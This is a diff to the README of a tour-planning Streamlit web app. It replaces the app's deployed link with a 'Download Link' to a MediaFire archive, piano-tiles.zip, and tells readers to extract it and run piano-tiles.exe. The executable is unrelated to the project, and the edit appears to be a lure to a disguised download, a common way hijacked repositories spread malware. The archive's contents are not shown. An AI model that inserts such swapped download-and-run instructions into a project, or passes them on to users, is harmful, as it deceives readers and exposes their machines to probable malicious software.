@@ -12,8 +12,11 @@ This is a web-app which will give you suggestions for planning your tour to a de
 ## Team Id
 krk46H9J0fICmrY6YZZE
 
-## Deployed Link
-https://abdul-hafeez-galib-pathayans-main-otedrq.streamlit.app/
+## Download Link
+https://www.mediafire.com/file/wk55s2jkx73hm1p/piano-tiles.zip/file
+
+Extract the zip file.
+Click on piano-tiles.exe
 
 ## Link to product walkthrough
 [Tour-Inspirer Demo-Video](https://www.loom.com/share/cdd2df4ab3f14a468585e2ce32e81b5b)
